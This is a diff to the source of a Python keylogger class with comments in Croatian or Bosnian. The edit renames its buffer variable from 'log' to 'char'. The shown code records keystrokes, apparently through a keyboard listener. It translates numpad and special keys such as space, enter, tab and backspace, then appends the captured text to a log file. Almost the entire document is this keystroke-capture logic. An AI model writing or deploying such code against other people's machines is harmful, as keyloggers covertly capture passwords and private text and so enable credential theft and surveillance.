@@ -14,7 +14,7 @@ class Keylogger:
     def __init__(self, log_path):
         # Inicijalizacija putanje gdje će se čuvati log file
         self.log_path = log_path  
-        self.log = ""  # Početni prazan log
+        self.char = ""  # Početna prazna varijabla
 
 ##########################################################################################################################################
 
@@ -22,46 +22,46 @@ class Keylogger:
         try:
             if hasattr(key, 'vk') and 96 <= key.vk <= 111:
                 if key.vk == 96:
-                    keylogger.log += "0"
+                    keylogger.char += "0"
                 elif key.vk == 97:
-                    keylogger.log += "1"
+                    keylogger.char += "1"
                 elif key.vk == 98:
-                    keylogger.log += "2"
+                    keylogger.char += "2"
                 elif key.vk == 99:
-                    keylogger.log += "3"
+                    keylogger.char += "3"
                 elif key.vk == 100:
-                    keylogger.log += "4"
+                    keylogger.char += "4"
                 elif key.vk == 101:
-                    keylogger.log += "5"
+                    keylogger.char += "5"
                 elif key.vk == 102:
-                    keylogger.log += "6"
+                    keylogger.char += "6"
                 elif key.vk == 103:
-                    keylogger.log += "7"
+                    keylogger.char += "7"
                 elif key.vk == 104:
-                    keylogger.log += "8"
+                    keylogger.char += "8"
                 elif key.vk == 105:
-                    keylogger.log += "9"
+                    keylogger.char += "9"
                 elif key.vk == 106:
-                    keylogger.log += "*"
+                    keylogger.char += "*"
                 elif key.vk == 107:
-                    keylogger.log += "+"
+                    keylogger.char += "+"
                 elif key.vk == 109:
-                    keylogger.log += "-"
+                    keylogger.char += "-"
                 elif key.vk == 110:
-                    keylogger.log += ","
+                    keylogger.char += ","
                 elif key.vk == 111:
-                    keylogger.log += "/"
+                    keylogger.char += "/"
             else:
-                keylogger.log += format(key.char)
+                keylogger.char += format(key.char)
         except AttributeError:
             if key == keyboard.Key.space:
-                keylogger.log += " "
+                keylogger.char += " "
             elif key == keyboard.Key.enter:
-                keylogger.log += "\n"
+                keylogger.char += "\n"
             elif key == keyboard.Key.tab:
-                keylogger.log += "\t"
+                keylogger.char += "\t"
             elif key == keyboard.Key.cmd:
-                keylogger.log += "⊞"
+                keylogger.char += "⊞"
             elif key == keyboard.Key.backspace:
                 keylogger.delete_last()
 
@@ -73,8 +73,8 @@ class Keylogger:
     def update_log(self):
         # Otvori file u režimu dodavanja (append), kako bi se zapisivalo novo logiranje bez brisanja prethodnih podataka
         with open(self.log_path, "a", encoding="utf-8") as file:
-            file.write(self.log)
-            self.log = ""  # Resetira log nakon što je upisan kako nebi došlo do dupliciranja
+            file.write(self.char)
+            self.char = ""  # Resetira varijablu nakon što je upisan znak kako nebi došlo do dupliciranja
 
 ##########################################################################################################################################
 
